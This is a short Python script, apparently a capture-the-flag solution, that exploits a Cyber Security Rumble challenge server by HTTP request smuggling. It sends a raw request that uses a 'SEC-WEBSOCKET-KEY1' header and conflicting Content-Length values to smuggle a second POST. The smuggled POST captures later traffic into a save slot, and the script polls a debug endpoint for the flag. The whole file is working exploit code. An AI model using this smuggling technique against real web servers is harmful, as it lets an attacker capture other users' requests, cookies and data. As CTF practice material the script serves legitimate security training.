import requests
import socket
import sys
import time

x = b"POST / HTTP/1.1\r\nHost: chal.cybersecurityrumble.de:22001\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 159\r\nSEC-WEBSOCKET-KEY1: a\r\n\r\necho=123POST /?save=cybercyber HTTP/1.1\r\nHost: chal.cybersecurityrumble.de:22001\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 600\r\n\r\necho="

HOST = 'chal.cybersecurityrumble.de'
PORT = 22001

while True:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(x)
        r = s.recv(4096)
        #print(r)

    time.sleep(5)

    res = requests.get('http://chal.cybersecurityrumble.de:22001/debug/cybercyber').text
    if 'flag' in res:
        print(res)
        break
